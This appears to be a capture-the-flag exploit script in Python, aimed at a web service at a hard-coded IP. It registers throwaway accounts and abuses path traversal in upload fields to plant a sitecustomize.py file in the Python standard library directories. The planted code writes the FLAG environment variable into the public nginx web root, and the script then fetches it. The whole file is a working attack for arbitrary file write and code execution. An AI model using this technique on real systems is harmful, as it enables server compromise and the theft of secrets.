import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE="http://144.79.188.39:36310"; pf.BASE=BASE
def fresh():
    u="u%d"%random.randint(10000,99999); pw="pass12345"
    requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
    return pf.login(u,pw), u
def plant_sitecustomize(ver, code):
    tok,u=fresh()
    sc = b'import os\ntry:\n    open("/usr/share/nginx/html/final.txt","w").write(os.environ.get("FLAG","NOFLAG")+"\\n")\nexcept Exception: pass\n'
    pid=pf.create_platform(tok,code,name="z"); mid=pf.create_mod(tok,ver,title="z"); bid=pf.create_build(tok,mid,pid)
    r=pf.upload_zip(tok,mid,bid,{"sitecustomize.py": sc})
    print("plant sitecustomize",ver,code,"->",r.status_code)
plant_sitecustomize("../../..","usr/lib/python3.11")
plant_sitecustomize("../../../usr/local","lib/python3.11")
print("planted sitecustomize in both stdlib dirs")
# check final.txt in case a restart already happened
try:
    c=requests.get(f"{BASE}/final.txt",timeout=6)
    print("final.txt now:", c.status_code, repr(c.text[:60]))
except Exception as e:
    print("final err",e)
